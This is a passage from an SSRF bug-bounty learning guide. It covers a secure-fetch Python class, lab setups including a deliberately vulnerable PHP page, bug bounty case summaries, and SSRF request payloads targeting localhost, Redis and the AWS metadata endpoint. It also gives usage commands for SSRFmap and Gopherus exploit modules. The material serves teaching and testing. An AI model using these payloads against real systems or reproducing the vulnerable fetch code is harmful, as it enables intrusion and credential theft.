        self.rate_limiter[client_ip].append(current_time)
        return True
    
    def secure_fetch(self, url, client_ip):
        """Comprehensive secure fetch with multiple protections"""
        
        # Rate limiting
        if not self.check_rate_limit(client_ip):
            raise ValueError("Rate limit exceeded")
        
        # URL validation
        is_safe, message = self.url_validator.validate_url(url)
        if not is_safe:
            raise ValueError(f"URL validation failed: {message}")
        
        # Domain allowlist check
        from urllib.parse import urlparse
        hostname = urlparse(url).hostname
        if not self.is_domain_allowed(hostname):
            raise ValueError(f"Domain '{hostname}' not in allowlist")
        
        # Perform the request with additional safety measures
        return self.url_validator.safe_fetch(url)
```

## 🧪 Practice Labs

### 1. 🎓 Beginner Labs

#### PortSwigger Web Security Academy - SSRF Labs
```
1. Basic SSRF against the local server
2. Basic SSRF against another back-end system
3. SSRF with blacklist-based input filter
4. SSRF with whitelist-based input filter
5. SSRF with filter bypass via open redirection
6. Blind SSRF with out-of-band detection
7. SSRF with filter bypass via open redirection
```

#### TryHackMe SSRF Room
```bash
# Access TryHackMe SSRF room
https://tryhackme.com/room/ssrf

# Topics covered:
- Basic SSRF concepts
- Internal network enumeration
- Cloud metadata access
- Filter bypass techniques
```

### 2. 🔬 Intermediate Labs

#### Custom SSRF Lab Setup
```php
<?php
// vulnerable-ssrf.php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    
    // Vulnerable: No validation
    $content = file_get_contents($url);
    echo "<h2>Content from: " . htmlspecialchars($url) . "</h2>";
    echo "<pre>" . htmlspecialchars($content) . "</pre>";
} else {
    echo '<form method="GET">
            <input type="text" name="url" placeholder="Enter URL" style="width: 400px;">
            <input type="submit" value="Fetch">
          </form>';
}
?>
```

#### Docker SSRF Lab
```dockerfile
# Dockerfile for SSRF practice
FROM php:7.4-apache

# Copy vulnerable application
COPY vulnerable-ssrf.php /var/www/html/

# Create internal service simulation
RUN echo "Internal Admin Panel" > /var/www/html/admin.txt
RUN echo "Database Config: user=admin, pass=secret123" > /var/www/html/config.txt

# Expose port
EXPOSE 80

# Start Apache
CMD ["apache2-foreground"]
```

### 3. 🚀 Advanced Labs

#### Multi-Service SSRF Environment
```yaml
# docker-compose.yml for advanced SSRF lab
version: '3'
services:
  web:
    build: .
    ports:
      - "80:80"
    networks:
      - internal
  
  redis:
    image: redis:alpine
    networks:
      - internal
  
  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: testdb
    networks:
      - internal
  
  elasticsearch:
    image: elasticsearch:7.9.0
    environment:
      - discovery.type=single-node
    networks:
      - internal

networks:
  internal:
    driver: bridge
```

## 🌍 Real-World Examples

### 1. 💰 High-Value Bug Bounty Reports

#### Capital One SSRF ($12,500)
- **Vulnerability**: SSRF in image processing service
- **Vector**: Image URL parameter accepting internal URLs
- **Impact**: Access to AWS metadata and internal services
- **Technique**: Bypassed filters using decimal IP representation
- **Key Learning**: Image processing services often have SSRF vulnerabilities

#### Shopify SSRF ($25,000)
- **Vulnerability**: SSRF in webhook functionality
- **Vector**: Webhook URL parameter
- **Impact**: Internal network reconnaissance and service access
- **Technique**: DNS rebinding attack to bypass IP filtering
- **Key Learning**: Webhook features are prime SSRF targets

#### Slack SSRF ($1,750)
- **Vulnerability**: SSRF in link preview feature
- **Vector**: Message containing internal URL
- **Impact**: Access to internal Slack infrastructure
- **Technique**: Used redirect chains to bypass filtering
- **Key Learning**: Link preview features commonly vulnerable to SSRF

### 2. 🏢 Enterprise Breaches

#### Uber SSRF (2016)
- **Cause**: SSRF in internal service
- **Impact**: Access to internal AWS metadata
- **Consequence**: Credential theft and data breach
- **Lesson**: SSRF can lead to complete infrastructure compromise

### 3. 📊 Common SSRF Patterns

#### Image Processing Services
```bash
# Common vulnerable endpoints
POST /api/image/process
{
  "image_url": "http://127.0.0.1:6379/"
}

POST /api/avatar/upload
{
  "avatar_url": "http://169.254.169.254/latest/meta-data/"
}
```

#### Webhook Functionality
```bash
# Webhook URL parameters
POST /api/webhooks
{
  "url": "http://internal-service:8080/admin",
  "events": ["user.created"]
}
```

#### PDF Generation Services
```bash
# HTML to PDF conversion
POST /api/pdf/generate
{
  "html": "<img src='http://127.0.0.1:22/'>"
}
```

## 🔧 Tools and Resources

### 🛠️ Essential SSRF Tools

#### SSRFmap
```bash
# Installation
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Usage examples
python3 ssrfmap.py -r data/request.txt -p url -m readfiles
python3 ssrfmap.py -r data/request.txt -p url -m portscan
python3 ssrfmap.py -r data/request.txt -p url -m aws
python3 ssrfmap.py -r data/request.txt -p url -m gopher
```

#### Gopherus
```bash
# Installation
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
chmod +x install.sh
./install.sh

# Generate Gopher payloads
python2 gopherus.py --exploit mysql
python2 gopherus.py --exploit redis
python2 gopherus.py --exploit smtp
```

### 📚 Learning Resources

#### Books
- **The Web Application Hacker's Handbook** - Chapter 10: Attacking Back-End Components
- **Real-World Bug Hunting** - SSRF case studies
- **Hands-On Bug Hunting for Penetration Testers** - SSRF techniques

#### Online Resources
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Tutorial](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

## 🎯 Key Takeaways

### ✅ Essential Skills to Master
- [ ] **Detection**: Identify SSRF in various application contexts
- [ ] **Enumeration**: Use SSRF for internal network reconnaissance
- [ ] **Exploitation**: Access cloud metadata and internal services
- [ ] **Bypass**: Circumvent IP filtering and other protections
- [ ] **Impact Assessment**: Understand and demonstrate business impact

### 🚀 Advanced Techniques to Learn
- [ ] **Protocol smuggling** - Gopher, Dict, and other protocols
- [ ] **DNS rebinding** - Advanced filter bypass techniques
- [ ] **Redirect chaining** - Using redirects to bypass protections
- [ ] **Cloud-specific attacks** - AWS, GCP, Azure metadata exploitation
- [ ] **Blind SSRF detection** - Out-of-band and time-based techniques

### 💡 Pro Tips for Bug Bounty Hunters
1. **Test all URL parameters** - Any parameter accepting URLs is potential SSRF
2. **Look for image processing** - Upload and processing features often vulnerable
3. **Check webhook functionality** - Webhook URLs are prime SSRF targets
4. **Test PDF generation** - HTML to PDF services commonly vulnerable
5. **Try different protocols** - Don't limit yourself to HTTP/HTTPS
6. **Use DNS rebinding** - Effective against IP-based filtering
7. **Chain with other vulnerabilities** - SSRF + RCE, SSRF + data exfiltration
8. **Focus on cloud environments** - Metadata access can be critical

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**⚖️ Legal Reminder**: Only test SSRF on systems you own or have explicit permission to test. Always follow responsible disclosure practices and respect bug bounty program rules.

**🎯 Next Steps**: Practice on the provided labs, study real-world examples, and focus on understanding internal network architectures. SSRF mastery comes with understanding network topologies and creative payload development.

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*